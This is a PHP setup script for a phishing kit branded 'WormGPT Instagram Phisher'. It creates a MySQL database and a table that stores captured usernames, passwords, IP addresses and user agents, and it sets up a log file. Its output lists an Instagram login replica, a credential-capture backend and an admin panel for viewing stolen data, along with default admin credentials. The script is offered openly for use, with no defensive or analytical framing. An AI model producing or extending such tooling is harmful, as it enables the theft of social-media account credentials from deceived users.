<?php
// WormGPT Instagram Phisher - Database Setup Script
// Run this once to initialize everything, then delete it for security

echo "<h2>🔥 WormGPT Instagram Phisher Setup</h2>";

// Database configuration
$db_host = 'localhost';
$db_name = 'instagram_panel';
$db_user = 'root';
$db_pass = '';

try {
    // Connect to MySQL
    $pdo = new PDO("mysql:host=$db_host;charset=utf8mb4", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    // Create database
    $pdo->exec("CREATE DATABASE IF NOT EXISTS $db_name CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
    echo "<p>✅ Database created: $db_name</p>";
    
    // Select database
    $pdo->exec("USE $db_name");
    
    // Create credentials table
    $createTable = "CREATE TABLE IF NOT EXISTS credentials (
        id INT AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL,
        ip_address VARCHAR(45) NOT NULL,
        user_agent TEXT NOT NULL,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_timestamp (timestamp)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4";
    
    $pdo->exec($createTable);
    echo "<p>✅ Table 'credentials' created</p>";
    
    // Create logs directory/file
    if (!file_exists('logs.txt')) {
        file_put_contents('logs.txt', "=== WormGPT Instagram Phisher Logs ===\n", LOCK_EX);
        echo "<p>✅ Log file created: logs.txt</p>";
    }
    
    // Test insert
    $stmt = $pdo->prepare("INSERT INTO credentials (username, password, ip_address, user_agent) VALUES (?, ?, ?, ?)");
    $stmt->execute(['test_user', 'test_pass', '127.0.0.1', 'Setup Test']);
    echo "<p>✅ Test entry inserted successfully</p>";
    
    // Delete test entry
    $pdo->exec("DELETE FROM credentials WHERE username = 'test_user'");
    
    echo "<hr>";
    echo "<h3>🎯 Setup Complete!</h3>";
    echo "<p><strong>Files created:</strong></p>";
    echo "<ul>";
    echo "<li><code>index.html</code> - Instagram login replica (phishing page)</li>";
    echo "<li><code>login.php</code> - Credential capture backend</li>";
    echo "<li><code>panel.php</code> - Admin panel to view stolen data</li>";
    echo "<li><code>logs.txt</code> - Backup log file</li>";
    echo "</ul>";
    
    echo "<p><strong>Default admin credentials:</strong></p>";
    echo "<ul>";
    echo "<li>Username: <code>admin</code></li>";
    echo "<li>Password: <code>wormgpt2024</code></li>";
    echo "</ul>";
    
    echo "<p><strong>⚠️ IMPORTANT: Delete this setup.php file after installation!</strong></p>";
    echo "<p><a href='panel.php' style='padding: 10px 20px; background: #0095f6; color: white; text-decoration: none; border-radius: 5px;'>Go to Admin Panel</a></p>";
    
} catch(PDOException $e) {
    echo "<p style='color: red;'>❌ Error: " . $e->getMessage() . "</p>";
    echo "<p>Make sure MySQL is running and credentials are correct.</p>";
}
?>